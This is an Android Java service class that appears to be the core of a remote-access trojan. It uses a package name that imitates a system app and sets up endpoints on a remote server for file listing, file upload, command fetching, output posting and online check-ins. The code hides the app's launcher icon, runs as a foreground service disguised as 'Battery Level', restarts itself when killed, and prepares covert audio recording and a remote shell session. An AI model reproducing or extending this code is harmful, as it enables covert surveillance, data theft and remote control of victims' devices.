package oom.android.system.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DeviceAdminService;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.util.Log;
import android.view.ActionMode;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import oom.android.system.Settings.TypeOpenFile;

public class MyService extends Service {

    static Context context;
    static Integer App_Version = 1;

    public final static String LOG_TAG = "myLogs";
    static String log_path;//полный путь до папки logs
    //ссылка на сайт
    final static String site = "http://test1.ru";
    final static String Devices = site+"/Devices/Default/";

    final static String filelist_url = Devices +"getlist.php";//возращает список файлов на сервере
    final static String uploader_url = Devices +"up.php";//для загрузки файлов на сервер
    final static String cmd_url = Devices +"getc.php";//возращает команду из файла c.txt
    public final static String post_url = Devices +"output.php";//файл output или же status
    final static String online_url = Devices +"online.php";//сообщает о онлайне
    final static String shelltime_url = Devices +"time.php";//время использования комманды на сервере

    static Integer userid=1;//default 1
    static boolean admin=false;//default false
    static String fname;   // for recorder

    static boolean recording=false;//Запись диктофона
    static boolean record_must_be_stopped = false;//Запись может быть остановленна
    public static MediaRecorder recorder;
    static boolean cmdsessionactive=false;//активирован ли поток шелла
    static HandlerThread waiterthread;//поток для hiddenwaiter
    public static int battery_level=0,battery_status=0,charge_type=0;
    static boolean syncactive = false;//режим синхронизации

    static boolean ScreenOn = false;//режим включенного экрана

    DevicePolicyManager devicePolicyManager;
    ComponentName  deviceAdmin;

    public static Context getContext(){
        return context;
    }
    public void onCreate() {
        init();
        startwaiter();
    }

    @SuppressLint({"MissingPermission", "HardwareIds"})
    public static String DeviceID() {
        String devicIMEI;
        devicIMEI = Build.ID+ String.valueOf(VERSION.SDK_INT);

        return devicIMEI;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("");
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        context = this;
        return Service.START_STICKY;
    }

    public void onDestroy() {
        sendBroadcast(new Intent("oom.android.system.restart"));  //сделает не убиваемым если система выключается
    }

    @Override
    public void onStart(Intent intent, int startId) {
    }

    void init(){
        try{
            log_path=getApplicationContext().getFilesDir().getAbsolutePath()+"/logs";

            PackageManager pkg=this.getPackageManager();
            pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
                startMyOwnForeground();
            else
                startForeground(1, new Notification());
        }
        catch(Exception e){}
    }


    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground()
    {
        String NOTIFICATION_CHANNEL_ID = "example_permanence";
        String channelName = "Battery Level Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Battery Level")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);
    }




    void startwaiter(){
        HiddenWaiter evilreceiver = new HiddenWaiter();
        try{
            waiterthread = new HandlerThread("hiddenwaiterthread");
            waiterthread.start();
            Looper customlooper = waiterthread.getLooper();
            Handler waiterhandler = new Handler(customlooper);
            IntentFilter myfilter = new IntentFilter();
            myfilter.addAction("android.intent.action.TIME_SET");
            myfilter.addAction("android.intent.action.SCREEN_ON");
            myfilter.addAction("android.intent.action.SCREEN_OFF");

            try{
                registerReceiver(evilreceiver, myfilter,null,waiterhandler);
            }
            catch(ExceptionInInitializerError e){
                unregisterReceiver(evilreceiver);
            }
        }
        catch(Exception e){

        }

    }

    void stopwaiter(){
        //Intent intent = new Intent();
        //intent.setAction("stopmyreciever");
        //sendBroadcast(intent);
        HiddenWaiter evilreceiver = new HiddenWaiter();
        unregisterReceiver(evilreceiver);
        waiterthread.quit();
    }

}
